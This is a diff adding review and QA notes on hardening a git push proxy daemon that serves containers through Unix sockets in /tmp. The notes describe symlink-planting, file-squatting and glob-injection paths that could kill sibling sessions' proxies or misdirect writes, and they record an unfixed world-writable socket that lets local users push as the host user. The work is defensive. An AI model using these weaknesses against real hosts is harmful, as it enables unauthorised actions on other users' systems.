+      file (skips the dir), a start raises PushProxyError, and _clear_lock_file removes
+      the link itself (never the target). (2) _write_metadata uses tempfile.mkstemp
+      (O_CREAT|O_EXCL, random name) instead of a predictable <proxy.json>.<pid>.tmp
+      name: the socket dir is bind-mounted writable into the container, so a planted
+      symlink there made the daemon write the sidecar through it and then os.replace
+      the link onto proxy.json. (3) _read_metadata opens with O_RDONLY|O_NOFOLLOW|O_NONBLOCK
+      and only accepts a regular file of bounded size (_METADATA_MAX_BYTES) — a planted
+      link, FIFO (blocks a start under the lock) or huge file is refused. (4) stop_all_proxies
+      now uses the guarded kill through the new _stop_socket_under_lock(), shared
+      with stop_session_proxies — the residual noted since i3. Also removed the legacy
+      start''s duplicated makedirs (_start_lock already reports it as PushProxyError)
+      and hoisted sys/tempfile imports to module level. Tests: tests/test_push_proxy.py
+      + tests/test_container.py 211 passed (log /pm-captures/review-db89-i7/); full
+      suite 3799 passed, 1 skipped, 13 failed (all pre-existing environment: 12 test_markdown_render
+      without the markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      log /pm-captures/review-db89-i7/full-suite.log. Two new tests/test_container.py
+      reuse-path tests pin R8''s get_proxy_socket_path(..., workdir=...) lookup and
+      the workdir a proxy restart uses. Spec updated with a Review iteration 10 refinements
+      section. Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the backlog of 16.'
+    created_at: '2026-10-27T09:35:31Z'
+    last_edited: '2026-10-27T09:35:31Z'
+  - id: note-70ff0fd
+    text: 'Review-loop db89 i8 (2026-10-27): reviewed 9648f07b (unchanged since db89
+      i7). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      No behavioural defect found this pass; three documentation/test-accuracy fixes
+      applied: (1) the registry comment read as if _active_proxies held both keying
+      schemes, but shared proxies are tracked only in _proxy_refs (which is why stop_session_proxies
+      unions the two) - a future cleanup reading _active_proxies alone would miss
+      every shared proxy, so the invariant is now stated; (2) TestSharedProxy docstring
+      said the 2-part key; (3) test_stop_session_removes_kept_socket_dirs now also
+      pins that session teardown clears the .lock file a shared stop deliberately
+      leaves beside the kept directory. Incidental: dropped an unused _CONTAINER_SOCKET_PATH
+      import from create_container (pyflakes). Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace):
+      3811 passed, 1 skipped, 1 failed - test_hook_events::test_installer_writes_standalone_receiver,
+      confirmed pre-existing at 74462d76 and unrelated (a standalone hook receiver
+      is not installed under a tmp HOME). Logs: /pm-captures/review-db89-i8/. Spec
+      updated with a Review iteration 11 refinements section. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive still cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time, so a long push serialises other requests on the same workdir; a shared
+      stop leaves its .lock beside the kept directory until session teardown. (2026-10-27)'
+    created_at: '2026-10-27T10:42:37Z'
+    last_edited: '2026-10-27T10:42:37Z'
+  - id: note-6c70773
+    text: 'Review-loop 6280 i1 (2026-10-27): reviewed f74c4e70. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact),
+      and test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 ==
+      3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Two
+      defects in the new teardown code fixed, each with a test that fails at f74c4e70
+      for the right reason: (1) _remove_proxy_dirs unlinked a matching discovery symlink
+      before deciding what to do with its target, so a sweep that left a directory
+      in place (a start in flight, or a live proxy) also destroyed the long-name link
+      — the only way a later process with an empty registry finds a hashed directory
+      to sweep, i.e. the iteration-5 leak through the sweep; the link is now unlinked
+      only when the target is removed, is not a proxy dir, or is not a dir. (2) PushProxy.stop()
+      unlinked the proxy.json sidecar with only FileNotFoundError handled, but the
+      socket dir is bind-mounted writable into the container, so a container can create
+      a *directory* named proxy.json — IsADirectoryError escaped stop() on the daemon
+      exit path (and in the in-process teardown); it now ignores OSError, matching
+      _kill_proxy_socket. Test gap closed: R1 realpath edge case (a symlinked/trailing-slash
+      spelling of one workdir shares one proxy) had no test; added test_same_workdir_via_a_symlink_shares_one_proxy,
+      which also pins R4 realpath comparison. Tests: tests/test_push_proxy.py + tests/test_container.py
+      214 passed; full suite 3814 passed, 1 skipped, 1 failed (pre-existing environment:
+      test_hook_events::test_installer_writes_standalone_receiver), run with PATH=/usr/bin:/bin,
+      PYTHONPATH=/workspace. Spec updated with Review iteration 12 refinements. Cross-PR
+      note left on pr-ac12b47 (#143) pointing its stale-proxy cleanup at the new helpers
+      instead of a fresh /tmp sweep. Residual, unchanged and out of scope: in-process
+      refcounts only (cross-process cleanup stays with #241/pr-ac12b47); one daemon
+      per workdir (option (3), workdir-per-request, remains the cleaner long-term
+      design); proxy_is_alive still cannot distinguish a busy daemon from a dead one
+      beyond the backlog of 16; the daemon serves one request at a time, so a long
+      push serialises other requests on the same workdir; a shared stop leaves its
+      .lock beside the kept directory until session teardown. (2026-10-27)'
+    created_at: '2026-10-27T16:36:22Z'
+    last_edited: '2026-10-27T16:36:22Z'
+  - id: note-4287c9c
+    text: 'Review-loop 6280 i2 (2026-10-27): reviewed b0e0550e. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 == 3;
+      and a 4-process concurrent start_push_proxy check yields exactly one socket
+      (R7 across processes, not just threads). One defect found and fixed in the newly
+      hardened teardown area: a long-name discovery symlink was followed whenever
+      its *target* looked like a proxy dir under /tmp owned by us (_is_proxy_dir +
+      st_uid), so a link planted at our long name and pointing at a sibling session
+      dir made stop_session_proxies resolve it, kill that session LIVE proxy and delete
+      the directory its container bind-mounts (reproduced at b0e0550e) and it double-counted.
+      Added _discovery_target/_is_foreign_discovery_link/_drop_foreign_discovery_link:
+      _remove_proxy_dirs, _kill_proxy_socket and _stop_socket_under_lock (checked
+      before taking a lock) unlink such a link and never touch its target; _shared_sock_dir
+      replaces a foreign link so a later registry-less teardown can still find the
+      hashed dir; get_proxy_socket_path ignores a socket reached through a foreign
+      link (the reuse path could otherwise believe its own dead proxy was alive).
+      _kill_proxy_socket now returns a bool and _stop_socket_under_lock propagates
+      it, so the reported/returned stop count is accurate. Tests: 7 new, 5 fail at
+      b0e0550e for the right reason (other live proxy killed; planted link not replaced;
+      lookup returns the other socket); test_teardown_follows_its_own_discovery_link
+      and test_discovery_target_matches_the_hashed_dir pin the legitimate path. tests/test_push_proxy.py
+      + tests/test_container.py: 221 passed. Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace):
+      3809 passed, 1 skipped, 13 failed - all pre-existing environment (12 test_markdown_render
+      without the markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      identical at b0e0550e. Spec updated with Review iteration 13 refinements. Residual,
+      unchanged and out of scope: in-process refcounts only (cross-process cleanup
+      stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the backlog of 16; the daemon serves one
+      request at a time; a shared stop leaves its .lock beside the kept directory
+      until session teardown.'
+    created_at: '2026-10-27T17:08:48Z'
+    last_edited: '2026-10-27T17:08:48Z'
+  - id: note-7f695ba
+    text: 'Review-loop 6280 i3 (2026-10-27): reviewed d872d080 (unchanged since 6280
+      i2). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies fails
+      at 74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Two /tmp leak paths found and fixed, each with a test that fails at d872d080
+      for the right reason: (1) _shared_sock_dir handled a directory and a foreign
+      symlink at the long discovery name but not a regular file squatting it — os.symlink
+      failed silently, no link was ever created, and a later process (empty registry,
+      e.g. after a TUI restart) then had no way to find the hashed directory: stop_session_proxies
+      returned 0 and the proxy plus its socket dir survived the session (reproduced:
+      link created False, dir removed False). The entry is now replaced when it is
+      ours (os.lstat st_uid), foreign ones left alone with the start still succeeding.
+      (2) _remove_proxy_dirs only unlinked symlinks for a non-directory match, so
+      a stale regular file on a proxy-shaped name was never reclaimed; it now goes
+      through _unlink_stale_entry(), which also removes a regular file that is ours.
+      Also: R7 put the start lock next to the socket directory (so rmdir can take
+      the dir), but build_exec_cmd EXIT trap only removed push.sock and proxy.json,
+      leaking /tmp/pm-push-proxy-<container>.lock for every per-container proxy a
+      killed pane tears down — stop_push_proxy cannot clear it either (it returns
+      early once the directory is gone) — so the trap now removes <realpath(sock_dir)>.lock
+      too. Tests: test_start_replaces_a_squatted_discovery_file, test_sweep_removes_a_regular_file_squatting_a_proxy_name,
+      extended test_cleanup_removes_proxy_socket; test_shared_sock_dir_keeps_a_foreign_squatted_file
+      pins the ownership half. tests/test_push_proxy.py + tests/test_container.py:
+      224 passed. Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace): 3825 passed,
+      1 skipped, 0 failed. Logs: /pm-captures/review-6280-i3/. Spec updated with Review
+      iteration 14 refinements. Residual, unchanged and out of scope: in-process refcounts
+      only (cross-process cleanup stays with #241/pr-ac12b47) — note that after a
+      TUI restart a same-workdir container created by another process is still unregistered,
+      so a sibling ref drop can unlink its live socket (dir survives; create_container
+      reuse respawns); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive still cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time; a shared stop still leaves its .lock beside the kept directory until
+      session teardown.'
+    created_at: '2026-10-27T17:38:31Z'
+    last_edited: '2026-10-27T17:38:31Z'
+  - id: note-fba6412
+    text: 'Review-loop 6280 i4 (2026-10-27): reviewed 286b0e5a. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 == 3 (all
+      three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Two fixes applied,
+      each with a test that fails at 286b0e5a for the right reason: (1) an unremovable
+      socket file (a container can leave a root-owned entry in a sticky dir, an immutable
+      file, or a chmod-d dir) raised a bare PermissionError out of both callers -
+      start_push_proxy surfaced it through wrap_claude_cmd as "Is docker running?",
+      and stop_session_proxies aborted the whole sweep so every other proxy of the
+      session survived. _unlink_socket_file now reports whether the path is gone (logging
+      the refusal); both start paths raise PushProxyError naming the stale socket
+      and workdir; _kill_proxy_socket returns False for a socket it could not stop
+      and leaves the daemon sidecar in place (the daemon still serves it), so the
+      sweep continues and the count stays accurate. (2) Documentation that still described
+      the old design: create_container said containers on the same branch share a
+      proxy, and the container git-wrapper comment said HOST_WORKDIR was for multiple
+      scenario containers sharing one - sharing is per workdir now and the path only
+      proves a request names its own clone. Tests: test_kill_proxy_socket_reports_an_unremovable_socket,
+      test_stop_session_survives_an_unremovable_socket, test_start_reports_an_unremovable_socket_as_proxy_error;
+      tests/test_push_proxy.py + tests/test_container.py 227 passed; full suite 3828
+      passed, 1 skipped (PATH=/usr/bin:/bin, PYTHONPATH=/workspace). Logs: /pm-captures/review-6280-i4/.
+      Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time; a shared stop still leaves its .lock beside the kept directory until
+      session teardown.'
+    created_at: '2026-10-27T18:10:50Z'
+    last_edited: '2026-10-27T18:10:50Z'
+  - id: note-24a8bcd
+    text: 'Review-loop 6280 i5 (2026-10-27): reviewed 61389980. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason.
+      One defect fixed: the two remaining teardown paths that take the per-directory
+      start lock (_stop_shared_proxy_socket, and the legacy per-container stop_push_proxy
+      branch) called _start_lock on a socket-dir path that can be a symlink planted
+      in world-writable /tmp; _start_lock resolves the directory, so a planted link
+      made it create and lock <target>.lock next to an arbitrary directory the planter
+      can write. Neither path is ever legitimately a symlink (_shared_sock_dir_path
+      returns the real readable dir or the hashed dir), so both now run _drop_foreign_discovery_link(sock_dir)
+      first — the guard _stop_socket_under_lock already uses — unlinking the link
+      and never its target. Tests: test_shared_stop_does_not_follow_a_planted_symlinked_dir
+      and test_legacy_stop_does_not_follow_a_planted_symlinked_dir both fail at 61389980
+      for the right reason (the victim .lock is created through the planted symlink)
+      and pass at HEAD. tests/test_push_proxy.py + tests/test_container.py: 229 passed.
+      Spec updated with Review iteration 16 refinements. Residual, unchanged and out
+      of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown.'
+    created_at: '2026-10-27T18:32:02Z'
+    last_edited: '2026-10-27T18:32:02Z'
+  - id: note-9c3105e
+    text: 'Review-loop 6280 i6 (2026-10-27): reviewed c5bd5ca9. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason
+      (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock, assert
+      1 == 3), verified this pass in a base-commit worktree. Two fixes applied, each
+      with a test: (1) stop_session_proxies interpolated the session tag raw into
+      its teardown globs. The tag comes from a directory name, so a repo directory
+      "repo[1]" yields the tag "repo[1]-abcd1234", whose "[1]" is a glob character
+      class: after a restart (empty in-process registry, where the glob is the only
+      way to find a proxy) the pattern matched nothing of its own — the proxy and
+      its socket directory survived the session — and it matched a sibling "pm-push-proxy-repo1-abcd1234-..."
+      directory, which the sweep deleted (a cross-session kill of the kind iteration
+      13 guards against). The tag now goes through glob.escape; test_stop_session_escapes_glob_metacharacters_in_the_tag
+      fails with glob.escape neutralised for exactly those reasons (count 0, proxy
+      alive, dir left behind, sibling deleted). (2) Test hygiene: test_stop_all_proxies_skips_a_busy_directory
+      called the real stop_all_proxies(), which sweeps every /tmp/pm-push-proxy-*
+      entry — run on a machine with a live session, the suite would stop that session''s
+      proxies and delete the socket directories its containers bind-mount (S18, the
+      failure this lifecycle prevents). The test now patches _SOCKET_DIR_PREFIX to
+      a test-only value and pins that a stand-in live directory survives. Also re-ran
+      the full lifecycle probe (hashed-dir shared stop keeps the dir and a restart
+      heals in place; SIGKILL leaves a stale socket and the restart respawns it; deleting
+      the socket under a live daemon is detected within one tick; foreign-workdir
+      request rejected) — all correct at HEAD. Tests: tests/test_push_proxy.py + tests/test_container.py
+      231 passed; full suite (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace
+      plus markdown on the path) 3831 passed, 1 skipped, 0 failed. Spec updated with
+      Review iteration 17 refinements. Residual, unchanged and out of scope: in-process
+      refcounts only (cross-process cleanup stays with #241/pr-ac12b47); one daemon
+      per workdir (option (3), workdir-per-request, remains the cleaner long-term
+      design); proxy_is_alive cannot distinguish a busy daemon from a dead one beyond
+      the backlog of 16; the daemon serves one request at a time; a shared stop still
+      leaves its .lock beside the kept directory until session teardown; a running
+      container whose socket directory was deleted and recreated keeps a stale bind
+      mount (the spec records that the host cannot heal it — R6 is what prevents it
+      in normal operation).'
+    created_at: '2026-10-27T19:33:01Z'
+    last_edited: '2026-10-27T19:33:01Z'
+  - id: note-48da8f8
+    text: 'Review-loop 6280 i7 (2026-10-27): reviewed 2f8fcda3. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact).
+      One defect fixed, each with a test that fails at 2f8fcda3 for the right reason:
+      PushProxy.stop() read FileNotFoundError from _owns_socket_path() as "already
+      gone — the unlink below is a no-op" and returned True. A daemon exits exactly
+      when its socket was removed (a shared stop unlinks it and keeps the directory),
+      so a restart for the same workdir could bind a fresh socket at that path in
+      the window between the ownership stat and the unlink — which then deleted the
+      replacement''s socket, leaving the container pointing at a dead socket (the
+      S18 failure through the daemon exit path rather than teardown). _owns_socket_path()
+      now reports a missing/unreadable path as "not owned", so stop() leaves it alone;
+      anything of ours is already gone and the metadata sidecar is best-effort (a
+      later start rewrites it, session teardown removes it). Tests: test_owns_socket_path_is_false_once_removed
+      (returns True at 2f8fcda3) and test_stop_does_not_unlink_a_socket_bound_after_removal
+      (the replacement file is deleted at 2f8fcda3). Also hoisted glob to module level
+      (no behaviour change). tests/test_push_proxy.py + tests/test_container.py: 232
+      passed. Full suite: 3833 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME, PATH=/usr/bin:/bin,
+      PYTHONPATH=/workspace; pytest<9 and markdown installed in a scratch dir). Spec
+      updated with Review iteration 18 refinements. Residual, unchanged and out of
+      scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown;
+      _start_proxy_subprocess leaves a daemon spawned during a readiness timeout running
+      (a later start reuses it).'
+    created_at: '2026-10-27T20:15:48Z'
+    last_edited: '2026-10-27T20:15:48Z'
+  - id: note-18c2d29
+    text: 'Review-loop 6280 i8 (2026-10-27): reviewed 045e2571. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason
+      (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock, assert
+      1 == 3). One defect fixed, with a test that fails at 045e2571 for the right
+      reason: (1) _start_lock created the socket directory and then checked it with
+      _sock_dir_start_problem(), but _remove_proxy_dirs can only skip a directory
+      whose start lock is held - and the start has not taken that lock yet at the
+      makedirs/check point. A session sweep racing a container start made the start
+      raise PushProxyError ("push proxy directory ... is unusable ([Errno 2] No such
+      file or directory)"), aborting container creation for a race the caller did
+      not cause (before iteration 9 the daemon own Path(sock).parent.mkdir() recreated
+      the directory, so the start succeeded). The makedirs + check now retry (bounded
+      by _START_DIR_ATTEMPTS) when the entry has vanished; an entry that still exists
+      is still refused, so a planted symlink or foreign directory is unchanged. Test:
+      test_start_recreates_a_dir_a_teardown_removed (fails at 045e2571 with exactly
+      that PushProxyError). Documentation: wrap_claude_cmd pr_id docstring still said
+      containers "on the same branch" share a proxy - the assumption this PR removes
+      (iteration 15 fixed the same wording in create_container and the git-wrapper
+      comment); it now names the workdir. Tests: tests/test_push_proxy.py + tests/test_container.py
+      233 passed; full suite 3834 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME,
+      PATH=/usr/bin:/bin, PYTHONPATH=/workspace; pytest<9 and markdown installed in
+      a scratch dir). Logs: /pm-captures/review-6280-i8/. Spec updated with Review
+      iteration 19 refinements. Incidental (pre-existing, filed as pr-e618b9c, not
+      changed here): the proxy socket is chmod 0o777 in a 0755 directory under world-writable
+      /tmp, so any local user can connect and have the daemon run git push/pull as
+      the host user; R4 narrows it to the proxy own workdir (previously any host path),
+      and closing it needs a private socket root plus a decision on the container-uid
+      assumption. Residual, unchanged and out of scope: in-process refcounts only
+      (cross-process cleanup stays with #241/pr-ac12b47); one daemon per workdir (option
+      (3), workdir-per-request, remains the cleaner long-term design); proxy_is_alive
+      cannot distinguish a busy daemon from a dead one beyond the backlog of 16; the
+      daemon serves one request at a time; a shared stop still leaves its .lock beside
+      the kept directory until session teardown; a blocking start waits on the directory
+      start lock without a deadline.'
+    created_at: '2026-10-27T20:49:41Z'
+    last_edited: '2026-10-27T20:49:41Z'
+  - id: note-7d1da53
+    text: 'Review-loop 6280 i9 (2026-10-27): reviewed 15c41573. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes with real subprocess daemons
+      (distinct socket per workdir, the restarted impl proxy lands the new impl commit,
+      QA stop leaves the impl socket dir intact); test_impl_and_qa_get_distinct_proxies
+      fails at 74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Two teardown paths unlinked the long-name discovery symlink while keeping its
+      directory, leaking a hashed socket dir past a registry-less sweep (the iteration-12
+      leak class through the kill/sweep ordering): (1) _kill_proxy_socket unlinked
+      the link before os.rmdir — the socket dir is bind-mounted writable, so a container
+      can leave an entry (or an unremovable socket / a proxy.json directory) that
+      makes the rmdir fail; reproduced: link gone, dir survives. (2) _remove_proxy_dirs
+      unlinked the link before shutil.rmtree(ignore_errors=True); a removal the host
+      cannot complete left the dir with no link. Both now unlink the link only when
+      the directory is actually gone (the sweep logs the refusal). Tests: test_kill_keeps_the_discovery_link_when_the_dir_survives
+      (a leftover file keeps the dir; the link survives and the next registry-less
+      sweep then removes both) and test_sweep_keeps_the_link_when_rmtree_fails (rmtree
+      patched to a no-op); both fail at 15c41573 for the right reason (os.path.islink(long_dir)
+      is False while the dir exists). Tests: tests/test_push_proxy.py + tests/test_container.py
+      235 passed; full suite 3836 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME,
+      PATH=/usr/bin:/bin, PYTHONPATH=/workspace plus pytest<9 and markdown in a scratch
+      dir). Spec updated with Review iteration 20 refinements. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive cannot distinguish a busy daemon
+      from a dead one beyond the backlog of 16; the daemon serves one request at a
+      time; a shared stop still leaves its .lock beside the kept directory until session
+      teardown; a blocking start waits on the directory start lock without a deadline;
+      the proxy socket is chmod 0o777 in world-writable /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T21:12:30Z'
+    last_edited: '2026-10-27T21:12:30Z'
+  - id: note-59798e2
+    text: 'Review-loop 6280 i10 (2026-10-27): reviewed 621e4881. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact),
+      and test_impl_and_qa_get_distinct_proxies fails at base 74462d76 with assert
+      1 == 3 (checked this pass in a base worktree). Two fixes applied, each with
+      a test that fails at 621e4881 for the right reason: (1) start_push_proxy created
+      the long-name discovery symlink in _shared_sock_dir *before* taking the start
+      lock, so a stop_session_proxies sweep that removed the hashed dir and its link
+      in that window left a live proxy with no link — unreachable by a later registry-less
+      teardown after a restart (the leak class iterations 5/12/13/14/20 fixed elsewhere).
+      The path now comes from the side-effect-free _shared_sock_dir_path and _shared_sock_dir
+      runs inside the lock; a failed start also no longer leaves a link pointing at
+      a directory it refused. (2) _start_lock called os.makedirs in both modes, so
+      a teardown racing a sweep recreated an empty directory plus a lock file; for
+      a shared stop (which keeps the directory) nothing removed them until the next
+      teardown. blocking=False now yields False when the directory is gone. Tests:
+      test_start_restores_a_discovery_link_a_sweep_removed, test_shared_stop_does_not_resurrect_a_removed_dir.
+      tests/test_push_proxy.py + tests/test_container.py 237 passed; full suite 3838
+      passed, 1 skipped, 0 failed (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace
+      plus pytest<9 and markdown in a scratch dir; log /pm-captures/review-6280-i10/).
+      Spec updated with Review iteration 21 refinements. Residual, unchanged and out
+      of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown;
+      a blocking start waits on the directory start lock without a deadline; the proxy
+      socket is chmod 0o777 in world-writable /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T21:41:31Z'
+    last_edited: '2026-10-27T21:41:31Z'
+  - id: note-d6d895e
+    text: 'Review-loop 6280 i11 (2026-10-27): reviewed c03c3aae. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at base 74462d76 with assert 1 ==
+      3 (checked this pass in a base worktree). One bookkeeping defect fixed, with
+      a test that fails at c03c3aae for the right reason: stop_session_proxies reaches
+      one hashed proxy through two candidate paths — the {tag}-* glob (long discovery
+      symlink) and the in-process registry (hashed dir), the latter added by iteration
+      5. When the socket dir survives the first stop (a container can leave an entry
+      in the bind mount, so the per-socket rmdir fails), the second spelling was processed
+      too and _kill_proxy_socket reported a stop for the already-removed socket (a
+      missing socket file counts as gone), so the function returned 2 for one proxy.
+      Candidates are now collapsed by real socket directory before the stop loop.
+      Test: test_stop_session_counts_a_hashed_proxy_once (assert 2 == 1 at c03c3aae).
+      Tests: tests/test_push_proxy.py + tests/test_container.py 238 passed; full suite
+      3839 passed, 1 skipped (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace;
+      pytest<9 + markdown in a scratch venv). Spec updated with Review iteration 22
+      refinements. Residual, unchanged and out of scope: in-process refcounts only
+      (cross-process cleanup stays with #241/pr-ac12b47); one daemon per workdir (option
+      (3), workdir-per-request, remains the cleaner long-term design); proxy_is_alive
+      cannot distinguish a busy daemon from a dead one beyond the backlog of 16; the
+      daemon serves one request at a time; a shared stop still leaves its .lock beside
+      the kept directory until session teardown; a blocking start waits on the directory
+      start lock without a deadline; the proxy socket is chmod 0o777 in world-writable
+      /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T22:17:03Z'
+    last_edited: '2026-10-27T22:17:03Z'
+  - id: note-3c66775
+    text: 'QA S1 (2026-10-27, container mode, nested podman, real file:// upstream):
+      PASS. Impl and QA containers on one PR got distinct workdir-keyed proxies —
+      impl proxy recorded the PR workdir, QA proxy the QA scenario clone; each container
+      saw its own /run/pm-push-proxy/push.sock and `git ls-remote origin` worked from
+      both; the QA start left the impl socket mount and proxy pid unchanged. impl
+      push -> QA push -> impl push 2 each landed its own commit upstream, each a fast-forward
+      of the previous, and the other clone branch ref never moved. Two scenario-script
+      caveats for the next run: (1) the literal glob /tmp/pm-push-proxy-<tag>-<prid>-*
+      also matches each proxy start-lock sibling <sockdir>.lock — filter to directories
+      to get the expected 2; (2) `git rev-parse --verify --quiet <full-sha>` returns
+      0 and echoes the SHA even for a nonexistent object, so use `git cat-file -e`
+      for the "commit absent from the other clone" checks. Captures: /pm-captures/scenarios/1/{impl-launch,qa-launch,verify-push}.
+      Setup note: pm-dev:latest had to be built inside the QA container first (`pm
+      container build-base`); nested podman needs --uts=host, which pm adds under
+      nested_podman.'
+    created_at: '2026-10-27T23:49:26Z'
+    last_edited: '2026-10-27T23:49:26Z'
+  - id: note-d558aed
+    text: 'Refiner note (QA scenario 4, 2026-10-27): the drafted recovery step ("reopen
+      the implementation session") cannot be driven by closing the impl window and
+      re-running `pm pr start`. build_exec_cmd wraps the impl pane in `bash -c "trap
+      ...; podman exec -it <ctr> ..."` with cleanup=True, so when the pane dies the
+      EXIT trap runs `podman rm -f <impl-ctr>` and the container is gone; and while
+      the impl window exists, `pm pr start` short-circuits on `find_window_by_name`
+      and never re-runs create_container. Refined recovery re-runs the same container-start
+      path by starting the review session on the same PR workdir (`pm pr review --fresh
+      <pr>`): same session tag + pr id + realpath(workdir) => same proxy key, so start_push_proxy
+      respawns the socket in the same bind-mounted directory while the impl container
+      keeps running (verify by unchanged container Id/StartedAt). Fixture requirements
+      verified: bare upstream must be addressed via a file:// URL (plain local-path
+      origins are refused by design), the PR entry must be committed on the base branch
+      (pm push then merge pm/sync-* into master, else pm pr start refuses with "not
+      committed on master yet"), and the test tmux session must be started with TMUX
+      unset (or on a private PM_TMUX_SOCKET) so `pm session` does not adopt the outer
+      session.'
+    created_at: '2026-10-27T23:32:33Z'
+    last_edited: '2026-10-27T23:32:33Z'
+  - id: note-cfb7a13
+    text: 'QA S4 (2026-10-28, container mode, nested podman): PASS. All four stories
+      verified against a throwaway project (fixture PR pr-4b110cf) with a file://
+      bare upstream: lost socket -> push exits 1 with "git-proxy: cannot connect:
+      [Errno 2] No such file or directory", upstream unchanged, local-only commit,
+      container id/StartedAt unchanged, mount has no push.sock; pm pr review --fresh
+      (same tag/pr/realpath(workdir)) respawns the socket in the same bind-mounted
+      dir with a new pid and the existing container pushes again; SIGKILLed daemon
+      (stale socket) -> "[Errno 111] Connection refused", then the same heal replaces
+      the stale entry; wrong-branch/--all/--mirror/--tags/--upload-pack/local-path-origin/foreign-workdir
